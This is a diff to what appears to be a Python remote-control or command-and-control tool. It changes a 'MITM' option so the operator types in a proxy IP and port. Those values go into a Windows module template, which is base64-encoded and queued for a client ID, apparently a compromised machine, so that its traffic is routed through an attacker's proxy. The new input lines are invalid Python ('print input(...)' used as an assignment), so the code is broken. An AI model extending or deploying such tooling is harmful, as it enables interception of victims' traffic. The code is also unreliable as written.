@@ -414,8 +414,11 @@ def main(platform_type=None):
             else:
                 print("Error: module unavailable on this platform.")
         elif 'MITM' in var:
-            oiHost = mitm_mod_win.replace("fooip", posthost)
-            oiPort = oiHost.replace("fooport", str(postport))
+            mitmIp = print input("Enter Proxy IP: ")
+            mitmPort = print input("Enter Proxy PORT: ")
+            print("Setting up... make sure you have proxy listening")
+            oiHost = mitm_mod_win.replace("fooip", mitmIp)
+            oiPort = oiHost.replace("fooport", str(mitmPort))
             replace_oi_encode = base64.b64encode(oiPort.encode()).decode()
             shared["text"] = replace_oi_encode
             shared["num"] = client_id
